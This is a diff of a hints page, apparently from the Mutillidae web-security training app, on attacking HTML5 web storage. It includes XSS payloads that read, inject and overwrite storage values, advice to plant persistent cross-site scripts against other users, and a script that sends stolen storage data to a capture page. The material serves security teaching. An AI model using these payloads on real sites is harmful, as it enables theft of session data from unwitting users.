@@ -3,7 +3,7 @@
 			<br/><br/>
 			HTML5 web storage is a simple database implemented by browsers
 			which allows web pages to store records. Records are key-value pairs.
-			Both the key and the value are of datatype string. 
+			Both the key and the value are of datatype string.
 <br/><br/>
 <a href="#videos" class="label"><img alt="YouTube" src="/images/youtube-play-icon-40-40.png" style="margin-right: 10px;" />Video Tutorials</a>
 			<br/><br/>
@@ -11,7 +11,7 @@
 			<br/><br/>
 			The Storage interface of the browser API
 			<br/>
-<code>							
+<code>
 interface Storage {
 	readonly attribute unsigned long length;
 	DOMString? key(unsigned long index);
@@ -21,17 +21,17 @@ interface Storage {
 	void clear();
 }
 </code>
-			<br/>		
+			<br/>
 			An "interface" is a software class that is only a definition in itself
 			and must be implemented to work. The Storage interface is implemented twice
-			in the browser as part of the "Window" DOM object. One implementation 
-			is the "Local Storage" object named "localStorage" and the other is 
+			in the browser as part of the "Window" DOM object. One implementation
+			is the "Local Storage" object named "localStorage" and the other is
 			the "Session Storage" object named "sessionStorage".
 			<br/><br/>
 			To call the methods defined in the interface, call them using the "window"
 			scope.
 			<br/><br/>
-			Example: 
+			Example:
 			<br/>
 <code>
 // grab local session storage
@@ -46,17 +46,17 @@ alert(m);
 					<br />
 					<span class="report-header">Locating pages which use HTML5 storage</span>
 					<br /><br />
-					Pages using HTML5 storage are easy to locate since the source code is client-side. The 
-					JavaScript API specifies the session storage objects are named sessionStorage and 
-					localStorage which are both properties of the window object. Developers may put the 
-					JavaScript in an included file, so check for JavaScript include file and search the 
+					Pages using HTML5 storage are easy to locate since the source code is client-side. The
+					JavaScript API specifies the session storage objects are named sessionStorage and
+					localStorage which are both properties of the window object. Developers may put the
+					JavaScript in an included file, so check for JavaScript include file and search the
 					source code for "sessionStorage" and "localStorage".
 					<br /><br />
 					<span class="report-header">Reading HTML5 storage from the Browser</span>
 					<br /><br />
-					The values a site has placed into your browser can be read by you. They can also 
-					be changed by you. Developers should know better than to place any type of 
-					authentication token anywhere on the client, but this problem has existed 
+					The values a site has placed into your browser can be read by you. They can also
+					be changed by you. Developers should know better than to place any type of
+					authentication token anywhere on the client, but this problem has existed
 					well before HTML5 storage and will continue with HTML storage.
 					<br />
 			  		If the web developer is trying to hide something in session storage or local storage
@@ -67,7 +67,7 @@ alert(m);
 			  		they cannot be viewed. Functionally, HTML 5 storage is analogous to a big
 			  		cookie.
 					<br /><br />
-					In some browsers, you can run JavaScript against the current page by 
+					In some browsers, you can run JavaScript against the current page by
 					placing the prefix "javascript"
 					followed by a colon and your JavaScript into the address bar.
 					<br/><br/>
@@ -77,14 +77,14 @@ alert(m);
 javascript:alert("It Works!");
 </code>
 				<br />
-				NOTE: If new browsers disable JavaScript in the URL bar, install a real-time page 
+				NOTE: If new browsers disable JavaScript in the URL bar, install a real-time page
 				editor such as FireBug. In Firebug, open the "console" and use the command-line
 				area at the bottom (Look for "&gt;&gt;&gt;").
 				<br/><br/>
 				HTML5 storage provides an API for interaction with JavaScript. Therefore if
-				you are using a page that uses HTML5 storage, you can read it with a 
+				you are using a page that uses HTML5 storage, you can read it with a
 				JavaScript. (The HTML5 storage is on your browser, so you may just be
-				able to use the browser itself.)  
+				able to use the browser itself.)
 				<br/><br/>
 				This script can read HTML5 storage from the page currently being browsed:
 				<br />
@@ -94,7 +94,7 @@ javascript:alert("It Works!");
 		var m = &quot;&quot;;
 		var l = window.localStorage;
 		var s = window.sessionStorage;
-		
+
 		for(i=0;i&lt;l.length;i++){
 			var lKey = l.key(i);
 			m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;
@@ -104,7 +104,7 @@ javascript:alert("It Works!");
 			var lKey = s.key(i);
 			m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;
 		};
-		
+
 		alert(m);
 	}catch(e){
 		alert(e.message);
@@ -131,11 +131,11 @@ try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStora
 </code>
 
 				<br />
-				Except in SECURE mode, this page has some "secrets" hidden in the HTML5 storage. 
+				Except in SECURE mode, this page has some "secrets" hidden in the HTML5 storage.
 				To figure out what are the items, use a JavaScript injection in the Back button or
-				the page footer (HTTP user-agent header) to inject your own JavaScript. 
-				An easier way would be to remember that all the HTML5 storage and all JavaScript 
-				is client-side which means it is running on your machine. You can simply read the 
+				the page footer (HTTP user-agent header) to inject your own JavaScript.
+				An easier way would be to remember that all the HTML5 storage and all JavaScript
+				is client-side which means it is running on your machine. You can simply read the
 				JavaScript that set the storage items.
 				<br/><br/>
 				<span class="report-header">Injecting values into session storage</span>
@@ -145,7 +145,7 @@ try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStora
 				is stored by domain, protocol, and port so any code used to set storage values
 				must be done in the context of the target page.
 				<br /><br />
-				This script will inject the following keys with the following values into the 
+				This script will inject the following keys with the following values into the
 				current page context. This context will be valid as long as the domain, protocol,
 				and port do not change.
 				<br/>
@@ -153,7 +153,7 @@ try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStora
 &lt;script&gt;
 	localStorage.setItem(&quot;AccountNumber&quot;,&quot;123456&quot;);
 	sessionStorage.setItem(&quot;EnterpriseSelfDestructSequence&quot;,&quot;A1B2C3&quot;);
-	sessionStorage.setItem(&quot;SessionID&quot;,&quot;japurhgnalbjdgfaljkfr&quot;);		
+	sessionStorage.setItem(&quot;SessionID&quot;,&quot;japurhgnalbjdgfaljkfr&quot;);
 	sessionStorage.setItem(&quot;CurrentlyLoggedInUser&quot;,&quot;1233456789&quot;);
 &lt;/script&gt;
 </code>
@@ -173,15 +173,15 @@ try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStora
 				<br /><br />
 				<span class="report-header">Over-writing existing HTML5 storage values</span>
 				<br /><br/>
-				Determine what the existing key-value pairs are in the HTML5 storage. 
+				Determine what the existing key-value pairs are in the HTML5 storage.
 				Use the scripts under section "Reading HTML5 storage". Choose the
-				key-value pair to set. Finally use a script to over-write the 
-				key-value pair. Note that the setItem() methods adds a new 
+				key-value pair to set. Finally use a script to over-write the
+				key-value pair. Note that the setItem() methods adds a new
 				key-value pair if the key does not already exist but over-writes
 				the current value if the key is present.
 				<br /><br />
 				A smaller script can be used to read the currently stored keys:
-				<br /> 
+				<br />
 <code>
 &lt;script&gt; var s = sessionStorage; var l = localStorage; var m = &quot;&quot;; for(i=0;i&lt;s.length;i++){m += &quot;sessionStorage:&quot; + s.key(i) + &quot;;\n&quot;;} for(i=0;i&lt;l.length;i++){m += &quot;localStorage:&quot; + l.key(i) + &quot;;\n&quot;;} alert(m); &lt;/script&gt;
 </code>
@@ -198,7 +198,7 @@ try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStora
 							in order to display the current values. Calling "init()" again after
 							changing the value should show the change. Watch carefully. The page will
 							display HTML5 storage from the initial call to init() then display
-							all the values again. Notice the message of the day is different in the 
+							all the values again. Notice the message of the day is different in the
 							second listing. Here is the modified script.
 							<br />
 <code>
@@ -217,12 +217,12 @@ try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStora
 							<br/>
 <code>
 &lt;script&gt;localStorage.setItem(&quot;MessageOfTheDay&quot;,&quot;Hello World&quot;); <span class="important-code">var node=window.document.getElementById(&quot;idSessionStorageTableBody&quot;); while(node.hasChildNodes()){node.removeChild(node.firstChild)};</span> init();&lt;/script&gt;
-</code>					
+</code>
 							<br /><br />
 							<span class="report-header">Reading another users HTML5 storage</span>
 							<br/><br/>
 							If you want to read someone elses session storage or local storage,
-							remember where the storage is located. The storage is on the client 
+							remember where the storage is located. The storage is on the client
 							machine	and is only accessible by scripts running in their browser.
 							Therefore you need to get your JavaScript to run on that users machine.
 							One way to do this is to either plant a persistent cross site script (XSS)
@@ -233,23 +233,23 @@ try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStora
 							tag can be effective without overtly alerting the user. JavaScript can
 							also be injected by wrapping the JavaScript code in script tags.
 							<br/><br/>
-							If injecting JavaScript into existing JavaScript code, 
+							If injecting JavaScript into existing JavaScript code,
 							using an XHR (aka AJAX aka Web 2.0) script is a good way to inject scripts
 							because the resulting script execution is less likely to be noticed by
 							the user.
 							<br/><br/>
-							We can collect the HTML5 storage using the same script as in "Reading HTML5 
+							We can collect the HTML5 storage using the same script as in "Reading HTML5
 							Storage" but instead of displaying the data in a popup alert box we can
 							send the data to a capture page.
 							<br/>
 <code>
 &lt;script&gt;
-	try{ 
+	try{
 		var s = sessionStorage;
 		var l = localStorage;
 		var m = &quot;&quot;;
 		var lXMLHTTP;
-					
+
 		for(i=0;i&lt;s.length;i++){
 			m += &quot;sessionStorage(&quot; + s.key(i) + &quot;):&quot; + s.getItem(s.key(i)) + &quot;; &quot;;
 		}
@@ -258,11 +258,11 @@ try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStora
 			m += &quot;localStorage(&quot; + l.key(i) + &quot;):&quot; + l.getItem(l.key(i)) + &quot;; &quot;;
 		}
 
-		var lAction = &quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m; 
-		lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; 
-		lXMLHTTP.open(&quot;GET&quot;, lAction); 
-		lXMLHTTP.send(&quot;&quot;); 
-	}catch(e){} 
+		var lAction = &quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m;
+		lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){};
+		lXMLHTTP.open(&quot;GET&quot;, lAction);
+		lXMLHTTP.send(&quot;&quot;);
+	}catch(e){}
 &lt;/script&gt;
 </code>
 							<br/>
@@ -272,7 +272,7 @@ try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStora
 								&lt;script&gt; try{ var s = sessionStorage; var l = localStorage; var m = &quot;&quot;; var lXMLHTTP; for(i=0;i&lt;s.length;i++){ m += &quot;sessionStorage(&quot; + s.key(i) + &quot;):&quot; + s.getItem(s.key(i)) + &quot;; &quot;; } for(i=0;i&lt;l.length;i++){ m += &quot;localStorage(&quot; + l.key(i) + &quot;):&quot; + l.getItem(l.key(i)) + &quot;; &quot;; } var lAction = &quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m; lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open(&quot;GET&quot;, lAction); lXMLHTTP.send(&quot;&quot;); }catch(e){} &lt;/script&gt;
 								</textarea>
 							</fieldset>
-							<br/>							
+							<br/>
 								Try injecting JavaScript into the user-agent HTTP header because it is displayed
 								in the footer.
 							<br /><br />
@@ -294,7 +294,7 @@ try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStora
 							The most practical vulnerabilities is the users message. Note the site does
 							not output encode the username or the users message. These values are
 							database values meaning they present a persistent cross site script.
-							
+
 							<br /><br />
 							<span class="report-header">Code which can read values from HTML-5 Web Storage</span>
 							<br/><br/>
@@ -303,21 +303,21 @@ try{
 	var m = &quot;&quot;;
 	var l = window.localStorage;
 	var s = window.sessionStorage;
-	
+
 	for(i=0;i&lt;l.length;i++){
 		var lKey = l.key(i);
 		m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;
 	};//end for
-	
+
 	for(i=0;i&lt;s.length;i++){
 		var lKey = s.key(i);
 		m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;
 	};//end for
-	
+
 	console.log(m);
 }catch(e){
 	alert(e.message);
-}	
+}
 </code>
 			<br /><br />
 			<span class="report-header">Read DOM Storage values from our browser</span>
@@ -411,11 +411,4 @@ try{
 			<br/><br/>
 			<span id="videos" class="report-header">Videos</span>
 			<br/><br/>
-			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->AddingValuestoDOMStorageusingCrosssiteScripting);?>
-			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->AlterValuesinHTML5WebStorageusingCrosssiteScript);?>
-			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->AlterValuesinHTML5WebStorageusingPersistentCrosssiteScript);?>
-			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->AlterValuesinHTML5WebStorageusingReflectedCrosssiteScript);?>
-			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WebPenTestingHTML5WebStorageusingJSONInjection);?>
-			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->StealingHTML5StorageviaJSONInjection);?>
-			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->ReadingHiddenValuesfromHTML5DomStorage);?>
 			<br/><br/>
